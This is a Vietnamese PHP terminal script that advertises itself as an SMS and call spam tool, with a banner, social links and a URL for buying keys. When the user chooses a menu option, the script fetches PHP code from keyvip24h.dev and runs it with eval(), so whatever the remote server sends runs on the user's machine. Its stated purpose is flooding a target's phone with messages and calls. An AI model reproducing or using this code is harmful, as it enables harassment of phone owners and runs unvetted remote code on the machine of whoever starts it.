<?php
@system("clear");
error_reporting(0);
session_start();
date_default_timezone_set('Asia/Ho_Chi_Minh');
/***[ Color ]***/
$xnhac = "\033[1;36m";
$do = "\033[1;31m";
$luc = "\033[1;32m";
$vang = "\033[1;33m";
$xduong = "\033[1;34m";
$hong = "\033[1;35m";
$trang = "\033[1;37m";
/***[ USERAGENT ]***/
$_SESSION['useragent'] = 'Mozilla/5.0 (Linux; Android 10; CPH1819) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36';
/***[ Đánh Dấu Bản Quyền ]***/
$thanh_dep = $do."[" . $trang . "=.=" . $do . "] ".$trang."=> ";
$thanh_xau = $do."[" . $trang . "=.=" . $do . "] ";
/***[ Delay ]***/
if (strtoupper(substr(PHP_OS, 0, 3)) === 'LIN') {
    $_SESSION['load'] = 2000;
} else {
    $_SESSION['load'] = 0;
}
/***[ Logo ]***/
$logo = "
\033[1;34m  █████╗ ███╗   ██╗     ██████╗ ██████╗ ██╗███╗   ██╗
\033[1;37m ██╔══██╗████╗  ██║    ██╔═══██╗██╔══██╗██║████╗  ██║
\033[1;34m ███████║██╔██╗ ██║    ██║   ██║██████╔╝██║██╔██╗ ██║
\033[1;37m ██╔══██║██║╚██╗██║    ██║   ██║██╔══██╗██║██║╚██╗██║
\033[1;34m ██║  ██║██║ ╚████║    ╚██████╔╝██║  ██║██║██║ ╚████║
\033[1;37m ╚═╝  ╚═╝╚═╝  ╚═══╝     ╚═════╝ ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
\033[1;31m────────────────────────────────────────────────────────────
\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;33mTOOL GỘP SPAM SMS + CALL 
\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;35mADMIN: \033[1;36mAN ORIN
\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;36mFB: \033[1;31manorintool970
\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mBOX SUPPORT: \033[1;37mhttps://zalo.me/g/dpfbxq529
\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;34mYOUTUBE: \033[1;37mhttps://youtube.com/@AnOrinTool970
\033[1;31m────────────────────────────────────────────────────────────\n";
system('clear');

echo $logo;
echo"\033[1;31m[\033[1;33mTHÔNG BÁO\033[1;31m]\n";
echo"\033[1;33m~ [HOT]: \033[1;36mbản này sẽ chạy đc cho iPhone \n";
echo"\033[1;33m~ 13/8: \033[1;36mMua Key Tại: \033[1;33mhttps://keyvip24h.dev/ \n";
echo"\033[1;31m────────────────────────────────────────────────────────────\n";
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m1\033[1;31m] \033[1;32mVào Tool Spam SMS + CALL V1 \n";
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m2\033[1;31m] \033[1;32mVào Tool Spam SMS + CALL V2 \n";
echo "\e[1;31m".str_repeat('──', 32)."\n";
sleep(1);
while(true){
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;37m===>: \033[1;33m";
$chonloaitool = trim(fgets(STDIN));
////Tool Tds
if($chonloaitool == '1'){
eval(file_get_contents('https://keyvip24h.dev/toolspam_an_orin/1.php'));

} else if($chonloaitool == '2'){
eval(file_get_contents('https://keyvip24h.dev/toolspam_an_orin/2.php'));
} else {
 echo"\033[1;31mLỗi Không Xác Định, Vui Lòng Thử Lại!!  \n";
    continue;
}
}#đóng while
/***[ FUNCTION ]***/
// function get_sever_tool($url){
    // $ch = curl_init($url);
    // curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    // curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    // $headers = array();
    // $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36';
    // $headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
    // $headers[] = 'Accept-Language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5';
    // curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    // $result = curl_exec($ch);
    // if (curl_errno($ch)) {
        // echo 'Vui lòng kiểm tra lại kết nối hoặc có thể do lỗi máy chủ!';
    // }
    // curl_close($ch);
    // return $result;
// }